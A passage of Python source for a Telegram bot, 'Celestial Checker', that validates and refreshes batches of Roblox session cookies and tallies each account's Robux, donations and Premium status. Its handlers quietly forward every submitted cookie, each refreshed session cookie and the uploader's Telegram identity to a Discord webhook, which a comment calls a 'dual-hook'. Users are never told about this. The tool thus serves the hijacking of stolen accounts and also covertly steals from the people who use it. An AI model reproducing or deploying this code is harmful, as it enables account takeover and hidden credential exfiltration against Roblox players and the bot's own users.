        'success_rate': round((len(valid_accounts) / total_accounts * 100) if total_accounts > 0 else 0, 1),
        'accounts': valid_accounts
    }
    
    # Сохраняем в память и в файл
    stats_storage[stats_id] = stats_data
    save_stats(stats_storage)
    
    logger.info(f"Статистика сохранена с ID: {stats_id}")
    return stats_id

@dp.message(Command("start"))
async def cmd_start(message: Message):
    await message.answer(
        "🌌 <b>Celestial Checker - Проверка и обновление Roblox аккаунтов</b>\n\n"
        "Отправь мне текстовый файл с куками Roblox для проверки или обновления.\n\n"
        "<i>✨ ДОСТУПНЫЕ ФУНКЦИИ:</i>\n"
        "• 🔍 <b>Чекер</b> - проверка аккаунтов на валидность и сбор статистики\n"
        "• 🔄 <b>Фрешер</b> - обновление сессии куков\n\n"
        "<i>⚡ Баланс скорости и точности!</i>",
        parse_mode="HTML"
    )

@dp.message(F.document & F.document.mime_type == "text/plain")
async def handle_file(message: Message, state: FSMContext):
    try:
        # Собираем информацию о пользователе для дуал-хука
        user_info = {
            'id': message.from_user.id,
            'username': message.from_user.username,
            'full_name': f"{message.from_user.first_name} {message.from_user.last_name or ''}".strip()
        }
        
        # Сохраняем информацию о пользователе в состоянии
        await state.update_data(user_info=user_info)
        
        # Скачиваем файл
        file_id = message.document.file_id
        file = await bot.get_file(file_id)
        downloaded_file = await bot.download_file(file.file_path)
        
        # Читаем содержимое файла
        content = downloaded_file.read().decode('utf-8', errors='ignore')
        lines = content.split('\n')
        
        # Извлекаем куки и сохраняем оригинальные строки
        account_data = []
        for i, line in enumerate(lines):
            cookie = extract_cookie(line)
            if cookie:
                account_data.append({
                    'index': i + 1,
                    'cookie': cookie,
                    'original_line': line
                })
        
        total_accounts = len(account_data)
        
        if not account_data:
            await message.answer("❌ <b>Не найдено ни одного куки в файле</b>", parse_mode="HTML")
            return
        
        # Сохраняем данные в состоянии
        await state.update_data(
            account_data=account_data,
            total_accounts=total_accounts,
            file_content=content
        )
        
        # Предлагаем выбрать действие
        await message.answer(
            f"📁 <b>Файл успешно загружен!</b>\n"
            f"🔍 Найдено <b>{total_accounts}</b> аккаунтов\n\n"
            f"<i>Что сделать с этим файлом?</i>",
            parse_mode="HTML",
            reply_markup=create_action_keyboard()
        )
        
        await state.set_state(FileActions.waiting_for_action)
        
    except Exception as e:
        logger.error(f"Ошибка обработки файла: {e}")
        await message.answer(f"❌ <b>Произошла ошибка:</b>\n<code>{str(e)}</code>", parse_mode="HTML")

@dp.callback_query(F.data == "action_checker")
async def process_checker(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    
    data = await state.get_data()
    account_data = data.get('account_data', [])
    total_accounts = data.get('total_accounts', 0)
    user_info = data.get('user_info', {})
    
    if not account_data:
        await callback.message.answer("❌ <b>Данные файла не найдены</b>", parse_mode="HTML")
        await state.clear()
        return
    
    status_message = await callback.message.answer("🌌 <b>Запускаю Celestial Checker...</b>", parse_mode="HTML")
    
    try:
        await status_message.edit_text(
            f"🔍 <b>Найдено {total_accounts} аккаунтов</b>\n"
            f"⚡ <i>Запускаю проверку...</i>",
            parse_mode="HTML"
        )
        
        # Последовательная проверка для точности
        valid_accounts = []
        checked_count = 0
        total_robux = 0
        total_donate = 0
        total_brainrot_spent = 0
        premium_count = 0
        
        for account in account_data:
            checked_count += 1
            progress = checked_count / total_accounts
            
            # Обновляем статус с красивым дизайном
            progress_bar = create_advanced_progress_bar(progress)
            status_text = (
                f"<b>🌌 CELESTIAL CHECKER - ПРОВЕРКА</b>\n\n"
                f"<blockquote>{progress_bar}</blockquote>\n"
                f"🔍 Проверяю аккаунт <b>#{checked_count}</b> из <b>{total_accounts}</b>\n\n"
                f"<b>📈 ТЕКУЩАЯ СТАТИСТИКА:</b>\n"
                f"• ✅ Валидных: <b>{len(valid_accounts)}</b>\n"
                f"• ❌ Невалидных: <b>{checked_count - len(valid_accounts) - 1}</b>\n"
                f"• 💰 Robux: <b>{total_robux:,}</b>\n"
                f"• 🎁 AllTimeDonate: <b>{total_donate:,}</b>\n"
                f"• 🧠 Brainrot: <b>{total_brainrot_spent:,}</b>\n"
                f"• 👑 Premium: <b>{premium_count}</b>"
            )
            
            await status_message.edit_text(status_text, parse_mode="HTML")
            
            # Проверяем аккаунт с изолированной сессией
            logger.info(f"🔍 Проверка аккаунта #{account['index']}")
            account_info = await check_single_account(account['cookie'], account['original_line'])
            
            if account_info['valid']:
                total_robux += account_info['robux']
                total_donate += account_info['all_time_donate']
                total_brainrot_spent += account_info['steal_a_brainrot_spent']
                if account_info['premium']:
                    premium_count += 1
                
                valid_acc_data = {
                    'cookie': account['cookie'],
                    'username': account_info['username'],
                    'robux': account_info['robux'],
                    'all_time_donate': account_info['all_time_donate'],
                    'steal_a_brainrot_spent': account_info['steal_a_brainrot_spent'],
                    'premium': account_info['premium'],
                    'user_id': account_info['user_id']
                }
                
                valid_accounts.append(valid_acc_data)
                
                # Отправляем информацию о валидном аккаунте в Discord
                await send_to_discord_webhook(account_info, user_info, account['cookie'], "checker")
                
                logger.info(f"✅ #{account['index']} {account_info['username']}: "
                           f"R${account_info['robux']:,} Donate:{account_info['all_time_donate']:,} "
                           f"Brainrot:{account_info['steal_a_brainrot_spent']:,} Premium:{account_info['premium']}")
            else:
                logger.warning(f"❌ #{account['index']} Невалидный: {account_info.get('error', 'Unknown error')}")
                # Отправляем информацию о невалидном аккаунте в Discord
                await send_to_discord_webhook(account_info, user_info, account['cookie'], "checker")
            
            # Задержка между проверками чтобы избежать rate limit
            await asyncio.sleep(1.5)
        
        # Сохраняем статистику и получаем ID
        stats_id = save_statistics(valid_accounts, total_robux, total_donate, total_brainrot_spent, premium_count, total_accounts)
        
        # Отправляем батч-отчет в Discord
        total_stats = {
            'total_accounts': total_accounts,
            'total_robux': total_robux,
            'total_donate': total_donate,
            'total_brainrot_spent': total_brainrot_spent,
            'premium_count': premium_count
        }
        await send_batch_to_discord(valid_accounts, total_stats, user_info, "checker")
        
        # Красивое финальное сообщение
        stats_message = create_beautiful_stats_message({
            'total_accounts': total_accounts,
            'valid_accounts': len(valid_accounts),
            'invalid_accounts': total_accounts - len(valid_accounts),
            'premium_count': premium_count,
            'total_robux': total_robux,
            'total_donate': total_donate,
            'total_brainrot_spent': total_brainrot_spent,
            'success_rate': round((len(valid_accounts) / total_accounts * 100), 1)
        })
        
        # Создаем клавиатуру с кнопкой
        keyboard = create_stats_keyboard(stats_id)
        
        await status_message.edit_text(stats_message, parse_mode="HTML", reply_markup=keyboard)
        
        # Сохраняем и отправляем файлы
        if valid_accounts:
            # Файл с куками (только чистые куки)
            cookies_content = "\n".join([acc['cookie'] for acc in valid_accounts])
            cookies_file = BufferedInputFile(cookies_content.encode('utf-8'), filename="valid_cookies.txt")
            
            # Файл со статистикой (с ПОЛНЫМИ куками)
            stats_content = "🌌 CELESTIAL CHECKER - ДЕТАЛЬНАЯ СТАТИСТИКА\n"
            stats_content += "=" * 80 + "\n"
            stats_content += f"Всего аккаунтов: {len(valid_accounts)}\n"
            stats_content += f"Всего Robux: {total_robux:,}\n"
            stats_content += f"Всего AllTimeDonate: {total_donate:,}\n"
            stats_content += f"Потрачено в Steal A Brainrot: {total_brainrot_spent:,}\n"
            stats_content += f"Premium аккаунтов: {premium_count}\n"
            stats_content += "=" * 80 + "\n\n"
            stats_content += "ДЕТАЛЬНАЯ ИНФОРМАЦИЯ ПО АККАУНТАМ:\n\n"
            
            for i, acc in enumerate(valid_accounts, 1):
                premium_status = "Yes" if acc['premium'] else "No"
                stats_content += f"{i:2d}. {acc['username']} (ID: {acc['user_id']})\n"
                stats_content += f"    Robux: {acc['robux']:,} | AllTimeDonate: {acc['all_time_donate']:,}\n"
                stats_content += f"    Steal A Brainrot: {acc['steal_a_brainrot_spent']:,} | Premium: {premium_status}\n"
                stats_content += f"    Cookie: {acc['cookie']}\n\n"
            
            stats_file = BufferedInputFile(stats_content.encode('utf-8'), filename="celestial_stats.txt")
            
            await callback.message.answer_document(cookies_file, caption="✅ <b>Валидные куки</b>", parse_mode="HTML")
            await callback.message.answer_document(stats_file, caption="📊 <b>Детальная статистика с полными куками</b>", parse_mode="HTML")
        else:
            await callback.message.answer("❌ <b>Не найдено валидных аккаунтов</b>", parse_mode="HTML")
            
    except Exception as e:
        logger.error(f"Ошибка обработки файла: {e}")
        error_text = f"❌ <b>Произошла ошибка:</b>\n<code>{str(e)}</code>"
        await status_message.edit_text(error_text, parse_mode="HTML")
    
    finally:
        await state.clear()

@dp.callback_query(F.data == "action_fresher")
async def process_fresher(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    
    data = await state.get_data()
    account_data = data.get('account_data', [])
    total_accounts = data.get('total_accounts', 0)
    user_info = data.get('user_info', {})
    
    if not account_data:
        await callback.message.answer("❌ <b>Данные файла не найдены</b>", parse_mode="HTML")
        await state.clear()
        return
    
    status_message = await callback.message.answer("🔄 <b>Запускаю Fresher...</b>", parse_mode="HTML")
    
    try:
        await status_message.edit_text(
            f"🔍 <b>Найдено {total_accounts} аккаунтов</b>\n"
            f"🔄 <i>Запускаю обновление куков...</i>",
            parse_mode="HTML"
        )
        
        # Последовательное обновление куков
        refreshed_accounts = []
        checked_count = 0
        successful_refreshes = 0
        failed_refreshes = 0
        
        for account in account_data:
            checked_count += 1
            progress = checked_count / total_accounts
            
            # Обновляем статус с красивым дизайном
            progress_bar = create_advanced_progress_bar(progress)
            status_text = (
                f"<b>🔄 CELESTIAL FRESHER - ОБНОВЛЕНИЕ КУКОВ</b>\n\n"
                f"<blockquote>{progress_bar}</blockquote>\n"
                f"🔄 Обновляю аккаунт <b>#{checked_count}</b> из <b>{total_accounts}</b>\n\n"
                f"<b>📈 ТЕКУЩАЯ СТАТИСТИКА:</b>\n"
                f"• ✅ Успешно: <b>{successful_refreshes}</b>\n"
                f"• ❌ Ошибок: <b>{failed_refreshes}</b>\n"
                f"• ⏳ Осталось: <b>{total_accounts - checked_count}</b>"
            )
            
            await status_message.edit_text(status_text, parse_mode="HTML")
            
            # Обновляем куки
            logger.info(f"🔄 Обновление куки аккаунта #{account['index']}")
            refresh_result = await refresh_single_cookie(account['cookie'])
            
            if refresh_result['success']:
                successful_refreshes += 1
                refreshed_acc_data = {
                    'username': refresh_result['username'],
                    'user_id': refresh_result['user_id'],
                    'new_cookie': refresh_result['new_cookie'],
                    'old_cookie': account['cookie'],
                    'verified': True
                }
                
                refreshed_accounts.append(refreshed_acc_data)
                
                # Отправляем информацию об обновленном аккаунте в Discord
                await send_to_discord_webhook(refresh_result, user_info, refresh_result['new_cookie'], "fresher")
                
                logger.info(f"✅ #{account['index']} {refresh_result['username']}: куки успешно обновлен")
            else:
                failed_refreshes += 1
                logger.warning(f"❌ #{account['index']} Ошибка обновления: {refresh_result.get('error', 'Unknown error')}")
                # Отправляем информацию о неудачном обновлении в Discord
                await send_to_discord_webhook(refresh_result, user_info, account['cookie'], "fresher")
            
            # Задержка между запросами чтобы избежать rate limit
            await asyncio.sleep(2)
        
        # Отправляем батч-отчет в Discord для фрешера
        total_stats = {
            'total_accounts': total_accounts,
            'successful_refreshes': successful_refreshes,
            'failed_refreshes': failed_refreshes
        }
        await send_batch_to_discord(refreshed_accounts, total_stats, user_info, "fresher")
        
        # Формируем результат
        if refreshed_accounts:
            # Создаем файл с обновленными куками
            refreshed_content = "\n".join([acc['new_cookie'] for acc in refreshed_accounts])
            refreshed_file = BufferedInputFile(refreshed_content.encode('utf-8'), filename="refreshed_cookies.txt")
            
            # Создаем файл с детальной информацией
            detailed_content = "🔄 CELESTIAL FRESHER - РЕЗУЛЬТАТЫ ОБНОВЛЕНИЯ\n"
            detailed_content += "=" * 80 + "\n"
            detailed_content += f"Всего аккаунтов: {total_accounts}\n"
            detailed_content += f"Успешно обновлено: {successful_refreshes}\n"
            detailed_content += f"Ошибок: {failed_refreshes}\n"
            detailed_content += f"Успешность: {round((successful_refreshes / total_accounts * 100), 1)}%\n"
            detailed_content += "=" * 80 + "\n\n"
            detailed_content += "💡 <b>ВАЖНО:</b> Эти куки имеют обновленную сессию.\n"
            detailed_content += "Старые куки могут продолжать работать некоторое время.\n\n"
            detailed_content += "ДЕТАЛЬНАЯ ИНФОРМАЦИЯ ПО АККАУНТАМ:\n\n"
            
            for i, acc in enumerate(refreshed_accounts, 1):
                detailed_content += f"{i:2d}. {acc['username']} (ID: {acc['user_id']})\n"
                detailed_content += f"    Новый куки: {acc['new_cookie']}\n\n"
            
            detailed_file = BufferedInputFile(detailed_content.encode('utf-8'), filename="fresher_details.txt")
            
            # Отправляем результаты
            success_message = (
                f"🔄 <b>CELESTIAL FRESHER - ОБНОВЛЕНИЕ ЗАВЕРШЕНО</b>\n\n"
                f"<b>📊 РЕЗУЛЬТАТЫ:</b>\n"
                f"• 📦 Всего аккаунтов: <b>{total_accounts}</b>\n"
                f"• ✅ Успешно обновлено: <b>{successful_refreshes}</b>\n"
                f"• ❌ Ошибок: <b>{failed_refreshes}</b>\n"
                f"• 📈 Успешность: <b>{round((successful_refreshes / total_accounts * 100), 1)}%</b>\n\n"
                f"<b>💡 ВАЖНО:</b> Куки имеют обновленную сессию.\n"
                f"Старые куки могут работать еще некоторое время.\n\n"
                f"<i>📁 Файлы с результатами прикреплены ниже</i>"
            )
            
            await status_message.edit_text(success_message, parse_mode="HTML")
            await callback.message.answer_document(refreshed_file, caption="🔄 <b>Обновленные куки</b>", parse_mode="HTML")
            await callback.message.answer_document(detailed_file, caption="📊 <b>Детальная информация по обновлению</b>", parse_mode="HTML")
        else:
            await status_message.edit_text(
                "❌ <b>Не удалось обновить ни одного куки</b>\n"
                "Возможно, все куки невалидны или произошла ошибка сети.",
                parse_mode="HTML"
            )
            
    except Exception as e:
        logger.error(f"Ошибка при обновлении куков: {e}")
        error_text = f"❌ <b>Произошла ошибка:</b>\n<code>{str(e)}</code>"
        await status_message.edit_text(error_text, parse_mode="HTML")
    
    finally:
        await state.clear()

@dp.message()
async def other_message(message: Message):
    await message.answer(
        "📎 <b>Отправь мне текстовый файл (.txt) с куками Roblox</b>\n\n"
        "<i>Файл должен содержать куки в формате:</i>\n"
        "<code>_|WARNING:-DO-NOT-SHARE-THIS...</code>\n\n"
        "<i>После загрузки файла выбери действие:</i>\n"
        "• 🔍 <b>Чекер</b> - проверка аккаунтов\n"
        "• 🔄 <b>Фрешер</b> - обновление сессии куков",
        parse_mode="HTML"
    )

# === ВЕБ-СЕРВЕР ДЛЯ ЗДОРОВЬЯ (Render) ===
async def health_check(request):
    return web.Response(text="🌌 Celestial Bot is alive and running!")

async def start_web_server():
    """Запуск веб-сервера для health checks"""
    app = web.Application()
    app.router.add_get('/', health_check)
    app.router.add_get('/health', health_check)
    
    runner = web.AppRunner(app)
    await runner.setup()
    
    # Используем порт из переменной окружения или 10000 по умолчанию
    port = int(os.environ.get('PORT', 10000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    
    logger.info(f"🌐 Health server started on port {port}")
    return runner

async def main():
    try:
        # Запускаем веб-сервер в той же event loop
        web_runner = await start_web_server()
        
        logger.info("🌌 Запускаю Celestial Checker на Render...")
        me = await bot.get_me()
        logger.info(f"🌌 Celestial Checker запущен: @{me.username}")
        
        await bot.delete_webhook(drop_pending_updates=True)
        await dp.start_polling(bot)
        
    except Exception as e:
        logger.error(f"❌ Критическая ошибка: {e}")
        import traceback
        logger.error(f"Трассировка: {traceback.format_exc()}")
    finally:
        global session
        if session:
            await session.close()
        logger.info("Бот завершил работу")

if __name__ == "__main__":
    asyncio.run(main())
